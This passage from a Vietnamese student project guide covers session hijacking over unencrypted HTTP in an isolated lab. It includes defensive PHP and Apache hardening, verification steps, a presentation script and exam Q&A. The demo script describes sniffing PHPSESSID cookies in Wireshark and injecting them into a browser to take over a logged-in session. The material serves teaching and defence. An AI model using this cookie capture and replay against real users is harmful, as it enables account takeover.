     * Họ và tên: *Nguyễn Văn Nạn Nhân*
     * Số tài khoản: *0833386443*
     * Số dư ví: *25.000.000 VNĐ*
   * 👉 **Kẻ tấn công đã chiếm đoạt hoàn toàn phiên làm việc của người dùng mà KHÔNG CẦN BIẾT MẬT KHẨU!**

---

## 3.4. BƯỚC 3: Triển khai giải pháp phòng thủ (Defense Implementation)

Trên máy ảo **`Target-Web-Server`**, nhóm triển khai đồng bộ 3 lớp phòng thủ chuẩn công nghiệp:

1. **Lớp 1 — Bật mã hóa toàn trình HTTPS (SSL/TLS cổng 443):**
   ```bash
   sudo a2enmod ssl
   sudo a2ensite default-ssl.conf
   sudo systemctl restart apache2
   ```
2. **Lớp 2 — Cấu hình cờ bảo mật Cookie (`HttpOnly`, `Secure`, `SameSite`) trong `/etc/php/*/apache2/php.ini`:**
   ```ini
   session.cookie_httponly = 1
   session.cookie_secure = 1
   session.cookie_samesite = "Strict"
   ```
   Sau đó khởi động lại Apache:
   ```bash
   sudo systemctl restart apache2
   ```
3. **Lớp 3 — Hủy phiên triệt để khi Đăng xuất (`logout.php`) & Tái tạo Session (`login.php`):**
   ```php
   // Hủy phiên triệt để trong logout.php
   $_SESSION = array();
   session_destroy();
   ```
   *(Và khuyến nghị gọi `session_regenerate_id(true)` ngay khi đăng nhập thành công trong `login.php` để chống Session Fixation).*

---

## 3.5. BƯỚC 4: Kiểm tra lại hiệu quả sau khi phòng thủ (Verification Phase)

Nhóm tiến hành kiểm tra lại trên cả 3 mặt để chứng minh biện pháp phòng thủ đã phát huy tác dụng:

### 1. Kiểm chứng chống nghe lén qua HTTPS (Wireshark):
* Nạn nhân truy cập bằng **`https://192.168.60.129/login.php`** và đăng nhập lại.
* Trên Wireshark máy Kali: bộ lọc `http.cookie contains "PHPSESSID"` không bắt được gói tin nào; lọc `tcp.port == 443` chỉ thấy **`TLSv1.3 Application Data`** bị mã hóa hoàn toàn.

### 2. Kiểm chứng khả năng chống XSS đánh cắp Cookie (`HttpOnly`):
* Sau khi đăng nhập lại qua HTTPS (để nhận Cookie mới có cờ `HttpOnly`), tại Chrome Nạn nhân nhấn phím `F12` -> tab **Console**, gõ:
  ```javascript
  document.cookie
  ```
* **Kết quả:** Trả về chuỗi rỗng `""`!
* **Ý nghĩa:** Nhờ có cờ `HttpOnly`, mã kịch bản độc hại hoàn toàn bị trình duyệt "bịt mắt", không thể đọc được `PHPSESSID` để gửi về máy chủ tin tặc.

### 3. Kiểm chứng khả năng chống Replay Attack sau khi Logout:
* Trên Trình duyệt Nạn nhân, nhấn nút **"Đăng xuất (Hủy phiên)"**.
* Trên Firefox Attacker (vốn đang giữ Cookie cũ), nhấn **F5 (Refresh)**.
* **Kết quả:** Attacker lập tức bị đẩy ra màn hình `login.php?error=unauthorized` vì Server đã gọi `session_destroy()`. Cookie cũ trở thành vô giá trị!

---

# PHẦN IV: BẢNG PHÂN CÔNG VAI TRÒ & KỊCH BẢN THUYẾT TRÌNH BẢO VỆ

## 4.1. Phân công vai trò chi tiết 3 thành viên

| Thành viên | Vai trò | Trách nhiệm cụ thể trong Đồ án |
| :--- | :--- | :--- |
| **Phan Nhật Hào** (PH) | **Trưởng nhóm & Kỹ thuật Hạ tầng Lab (Network & Infrastructure)** | - Thiết lập hệ thống máy ảo VMware Workstation (`Target-Web-Server` Apache2/PHP & mạng ảo cô lập).<br>- Phụ trách kỹ thuật bắt gói tin mạng trên Wireshark, lọc cú pháp `PHPSESSID`.<br>- Quản lý tiến độ chung của toàn nhóm. |
| **Đào Duy Quân** (ĐQ) | **Kỹ thuật Ứng dụng & Demo Hijacking (Application & Exploitation)** | - Sử dụng công cụ CEH v13 (Hetty/CAIDO) và Firefox Storage / Cookie-Editor trên Kali Linux.<br>- Thực hiện thao tác bơm Cookie để chiếm phiên thành công.<br>- Quay và biên tập video clip demo full HD (có phụ đề/lồng tiếng) làm backup. |
| **Nguyễn Quang Vinh** (NV) | **Giải pháp Phòng thủ, Soạn thảo Báo cáo & Slide (Defense & Documentation)** | - Triển khai cấu hình HTTPS (`a2enmod ssl`), cờ `HttpOnly`, `Secure`, `SameSite` trong `php.ini` và `logout.php`.<br>- Thực hiện các bước kiểm chứng hiệu quả sau phòng thủ.<br>- Soạn thảo cuốn Báo cáo đồ án (Word/PDF) và thiết kế slide thuyết trình chuẩn nhận diện UTH. |

---

## 4.2. Kịch bản phân vai khi đứng trước Hội đồng Giảng viên

Khi nhóm 3 người lên bảng báo cáo (thời lượng khuyến nghị: 10 - 15 phút):

* **Phút 00 - 03 (Nguyễn Quang Vinh trình bày):**
  * Kính chào Thầy/Cô và các bạn sinh viên.
  * Giới thiệu tên đề tài: *Tấn công chiếm quyền điều khiển phiên (Session Hijacking) trên giao thức không bảo mật*.
  * Trình bày lý thuyết nền tảng: Tính chất Stateless của HTTP, sự ra đời của Session & Cookie, và lý do vì sao HTTP cleartext là lỗ hổng chí mạng.
* **Phút 03 - 08 (Phan Nhật Hào & Đào Duy Quân phối hợp Demo trực tiếp):**
  * **Hào:** Mở VMware Workstation với máy ảo `Target-Web-Server` (`192.168.60.129`), cho nạn nhân trên Chrome đăng nhập cổng thông tin UTH (`http://192.168.60.129/login.php`) và mở Wireshark trên Kali cho Hội đồng xem gói tin `PHPSESSID` lộ rõ dạng plaintext.
  * **Quân:** Đóng vai Hacker trên Kali Linux, copy chuỗi `PHPSESSID` bắt được từ Wireshark, mở trình duyệt Firefox, nạp Cookie vào F12 Storage / Cookie-Editor và vào `/dashboard.php`. Trang cá nhân hiện ra ngay lập tức!
* **Phút 08 - 12 (Nguyễn Quang Vinh & Đào Duy Quân trình bày Giải pháp Phòng vệ):**
  * **Vinh:** Chuyển Snapshot (hoặc bật trực tiếp HTTPS cổng 443 + `php.ini` `HttpOnly` / `Secure` / `SameSite`), giải thích nguyên lý từng lớp phòng thủ.
  * **Quân:** Cho Hội đồng xem Wireshark cổng 443 chỉ toàn `TLSv1.3 Application Data`; mở F12 Console gõ `document.cookie` ra `""`; bấm Đăng xuất để chứng minh Cookie cũ bị vô hiệu hóa khi F5 trên Firefox Attacker.
* **Phút 12 - 15 (Cả nhóm):**
  * Hào tóm tắt kết luận và bài học kinh nghiệm.
  * Cả 3 thành viên sẵn sàng lắng nghe và trả lời câu hỏi phản biện của Hội đồng.

---

# PHẦN V: BỘ CÂU HỎI PHẢN BIỆN VẤN ĐÁP CỦA GIẢNG VIÊN VÀ ĐÁP ÁN CHUẨN

Bộ câu hỏi này được biên soạn dựa trên thực tế các câu hỏi mà Giảng viên bộ môn An ninh mạng UTH thường đặt ra để kiểm tra mức độ hiểu bản chất của sinh viên:

### Câu hỏi 1: Tại sao truyền thông bằng HTTP thì kẻ tấn công lại dễ dàng lấy được Cookie, còn HTTPS thì không?
* **Đáp án chuẩn 10/10:**
  * Giao thức HTTP truyền toàn bộ dữ liệu ở dạng văn bản rõ (plaintext) không mã hóa. Các trường Header như `Cookie: ...` nằm lộ thiên ở tầng ứng dụng, nên bất kỳ ai nằm trên đường truyền (cùng mạng LAN, Wi-Fi chung, router trung gian) đều có thể bắt gói tin bằng card mạng ở chế độ Promiscuous Mode và đọc được nội dung bằng mắt thường.
  * Ngược lại, HTTPS sử dụng giao thức bảo mật TLS/SSL. Quá trình bắt tay TLS sẽ thiết lập một kênh mã hóa đối xứng (AES-256 hoặc ChaCha20) giữa Client và Server trước khi bất kỳ dữ liệu HTTP nào được truyền đi. Do đó, toàn bộ HTTP Request (bao gồm URL, Header và Cookie) đều bị mã hóa thành ciphertext. Kẻ tấn công bắt gói tin trên Wireshark chỉ thấy **TLS Application Data** vô nghĩa.

### Câu hỏi 2: Cờ `HttpOnly` có ngăn chặn được kẻ tấn công dùng Wireshark bắt gói tin trên mạng LAN hay không? Vì sao?
* **Đáp án chuẩn 10/10:**
  * **KHÔNG.** Cờ `HttpOnly` hoàn toàn không có tác dụng ngăn chặn Wireshark bắt gói tin.
  * **Giải thích:** Cờ `HttpOnly` là cơ chế bảo mật do **trình duyệt (Browser Engine)** thực thi, nhằm ngăn chặn mã kịch bản JavaScript phía Client truy cập vào thuộc tính `document.cookie` (chống lỗ hổng XSS). Tuy nhiên, khi gói tin rời khỏi trình duyệt và đi xuống tầng mạng (Network Layer) qua giao thức HTTP không mã hóa, Cookie vẫn nằm ở dạng plaintext trong gói tin. Card mạng của Attacker chạy Wireshark sẽ bắt trực tiếp các khung dữ liệu (frames) này từ cáp mạng hoặc sóng Wi-Fi mà không thông qua trình duyệt, do đó vẫn lấy được Cookie bình thường.
  * Để ngăn chặn Wireshark bắt gói tin, giải pháp duy nhất bắt buộc phải là **HTTPS**.

### Câu hỏi 3: Phân biệt sự khác nhau giữa Session Hijacking và Session Spoofing?
* **Đáp án chuẩn 10/10:**
  * **Session Hijacking (Chiếm quyền phiên):** Nạn nhân **đã đăng nhập thành công** và đang sở hữu một phiên làm việc hợp lệ đang hoạt động (Active Session). Kẻ tấn công can thiệp, đánh cắp định danh phiên (Session Token) đó và nhảy vào tiếp quản chính phiên làm việc hợp lệ của nạn nhân.
  * **Session Spoofing (Mạo danh phiên):** Kẻ tấn công giả mạo danh tính (như giả mạo địa chỉ IP nguồn - IP Spoofing) để **tự khởi tạo một kết nối mới** với Server ngay từ đầu, lừa Server tin rằng mình là người dùng hợp lệ, mà không cần nạn nhân phải có một phiên đang hoạt động.

### Câu hỏi 4: Ngoài việc triển khai HTTPS, lập trình viên cần làm những gì để bảo vệ phiên làm việc của ứng dụng Web?
* **Đáp án chuẩn 10/10 (Chiến lược Phòng thủ theo chiều sâu - Defense in Depth):**
  1. **Tái tạo Session ID (Session Regeneration):** Cấp Session ID mới ngay sau khi người dùng đăng nhập thành công để chống Session Fixation.
  2. **Thiết lập đầy đủ các cờ Cookie:** `HttpOnly` (chống XSS), `Secure` (chống rò rỉ qua HTTP), `SameSite=Strict/Lax` (chống CSRF).
  3. **Thuật toán sinh Session ID an toàn (High Entropy):** Sử dụng bộ sinh số ngẫu nhiên an toàn mật mã (CSPRNG của hệ điều hành / PHP `random_bytes()`), độ dài tối thiểu 128-bit để chống tấn công đoán phiên (Brute-force/Prediction).
  4. **Cấu hình thời gian chờ phiên (Timeout):** Thiết lập cả *Idle Timeout* (hết hạn khi không hoạt động) và *Absolute Timeout* (buộc đăng nhập lại sau một khoảng thời gian cố định).
  5. **Hủy phiên triệt để khi Logout:** Xóa session trong bộ nhớ/file lưu trữ của Server (`session_destroy()`) và xóa cookie trên Client.
  6. **Ràng buộc ngữ cảnh phiên (Session Binding):** Liên kết session với User-Agent hoặc IP và áp dụng xác thực hai yếu tố (2FA/MFA).

### Câu hỏi 5: Tấn công Session Fixation hoạt động như thế nào và cách phòng chống?
* **Đáp án chuẩn 10/10:**
  * **Cơ chế:** Kẻ tấn công chủ động lấy một Session ID hợp lệ nhưng chưa đăng nhập từ máy chủ (ví dụ: `SID=123456`), sau đó gửi liên kết chứa Session ID này cho nạn nhân (qua email lừa đảo hoặc XSS). Khi nạn nhân bấm vào link và đăng nhập thành công với tài khoản của họ, nếu máy chủ giữ nguyên `SID=123456` mà không đổi mới, kẻ tấn công chỉ cần mở trình duyệt với `SID=123456` là sẽ truy cập thẳng vào tài khoản của nạn nhân.
  * **Cách phòng chống:** Máy chủ web bắt buộc phải gọi hàm tái tạo phiên ngay sau khi người dùng xác thực thành công (trong PHP là hàm `session_regenerate_id(true)`).

### Câu hỏi 6: Trong các công cụ của CEH v13 (Hetty, CAIDO, OWASP ZAP), công cụ nào vượt trội nhất cho việc kiểm thử Session Hijacking?
* **Đáp án chuẩn 10/10:**
  * Mỗi công cụ có một thế mạnh riêng biệt:
    * **CAIDO:** Vượt trội về hiệu năng và tốc độ xử lý vì được viết bằng ngôn ngữ Rust, cực kỳ nhẹ, không tốn RAM như Java, giao diện hiện đại, công cụ Replay và chỉnh sửa Cookie trong header rất nhanh gọn.
    * **OWASP ZAP:** Vượt trội về tính năng tự động hóa kiểm thử bảo mật. ZAP có module *Token Analysis* giúp kiểm tra phân phối ngẫu nhiên (entropy) của Session ID để biết hệ thống có dễ bị đoán token hay không, đồng thời tự động quét các cờ `HttpOnly`/`Secure` bị thiếu.
    * **Hetty:** Vượt trội về tính tiện dụng, được biên dịch thành một file thực thi duy nhất bằng ngôn ngữ Go, có sẵn Web UI, rất thích hợp để triển khai nhanh làm MITM Proxy mà không cần cài đặt môi trường phức tạp.

---

> 🎯 **Lời khuyên cho Nhóm 22:**
> File tài liệu này đã bao quát 100% yêu cầu về kiến thức chuyên sâu và kịch bản thực hành trên môi trường ảo VMware Workstation. Các bạn thực hiện theo đúng 4 bước tại [PHẦN III](#phần-iii-kịch-bản-và-các-bước-demo-thực-thi-step-by-step-lab-demo) và chuẩn bị các câu trả lời tại [PHẦN V](#phần-v-bộ-câu-hỏi-phản-biện-vấn-đáp-của-giảng-viên-và-đáp-án-chuẩn) là hoàn toàn tự tin đạt điểm số cao nhất trong buổi bảo vệ Đồ án An ninh mạng tại UTH!
